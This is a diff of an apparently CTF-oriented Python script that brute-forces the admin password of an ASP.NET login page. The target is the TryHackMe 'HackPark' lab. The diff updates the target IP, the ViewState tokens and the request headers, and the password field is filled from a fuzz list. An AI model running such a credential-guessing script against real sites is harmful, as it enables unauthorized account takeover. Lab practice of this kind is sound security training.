@@ -237,24 +237,27 @@ async def post(session, index, FUZZ, filter, semaphore):
 
     get the body and the headers, replace the previous below
     """
+    url = "http://10.10.128.199/Account/login.aspx?ReturnURL=%2fadmin%2f"
+
+    headers = {
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Language': 'en-US,en',
+        'Cache-Control': 'max-age=0',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Origin': 'http://10.10.128.199',
+        'Referer': 'http://10.10.128.199/Account/login.aspx?ReturnURL=/admin/',
+        'Sec-GPC': '1',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    }
+
     payload = {
-        '__VIEWSTATE': 'FtDWXBorgd5PnS3Zm/OOFb8G6Z+z2Di8+D6C2nXaT0BXEV77JRgpiq0q4001bzaa1xC9v1tu0/eGq7NVZPeYx+rPqeBIUqcVJ5jflfJ6itd1+jhXLZQ/vl8xJBL355kPh4lIx6Bl8b+Uj6EV7eNFRo5k0V9CnfiEjXF64Dt7AzovFM5b',
-        '__EVENTVALIDATION': 'WdQGNjnu0klLhxIo2w/iePIaOG7I6V4l/dJujt8W5v5HUCOWh68wRWrYoiMhQw1SK5jE/bSl+bj0ptVZ1Iq4eoV/5WlyvRLnmJ/kEXa7S8CyBGEUisnGk1u0rXPd/zQhXbzFNQHnRYefaH3240eaNeKrgUR+iyALg9mq63v+/PlaUQzn',
+        '__VIEWSTATE': 'jZtE7wqYwR3zrMFIyFbn6B4tvy7Ttka/xpq49sTp+nEK3L+47GFuN+ytRS6ApURWP8RHkvcUytQnp8a49zizvXobE9LH6413hEAAXe4ngkuIeupIcu0Sb3Qs0Y+gGm2bZs7v7zvExuPHhWd7bcjzo3Bpi+QBVFYDg3EIhqZLzodq201x',
+        '__EVENTVALIDATION': '144pnMKBET51z6TC+tbrM1/prBnBdwpO71xsdCS67jfZ48p6n0al+YdxsFYmhlkffqv7u7ZvSrvki2MS9Y0EtYJJO/BUNU09rfjqsFRzbBH1SCNJg/Q2VXkug9rsV/1ULEjtza66dRyKvGIEd0pbTLGOH1zf5sYB8/RbrTcdyGipBUt8',
         'ctl00$MainContent$LoginUser$UserName': 'admin',
         'ctl00$MainContent$LoginUser$Password': FUZZ,
         'ctl00$MainContent$LoginUser$LoginButton': 'Log in',
-    }
-
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin': 'http://10.10.151.23',
-        'Connection': 'keep-alive',
-        'Referer': 'http://10.10.151.23/Account/login.aspx?ReturnURL=%2fadmin%2f',
-        'Upgrade-Insecure-Requests': '1',
-        'Priority': 'u=1',
     }
     """
     HTTP FORMS
@@ -322,8 +325,8 @@ async def main():
 if __name__ == "__main__":
     # https://tryhackme.com/r/room/hackpark
     # this is the room we tried this
-    url = "http://10.10.151.23/Account/login.aspx?ReturnURL=%2fadmin%2f"
-    
+    # url = "http://10.10.151.23/Account/login.aspx?ReturnURL=%2fadmin%2f"
+    url= "http://10.10.128.199/Account/login.aspx?ReturnURL=%2fadmin%2f"
     start_time = time.time()
     print("[+] Starting requests")
     asyncio.run(main())
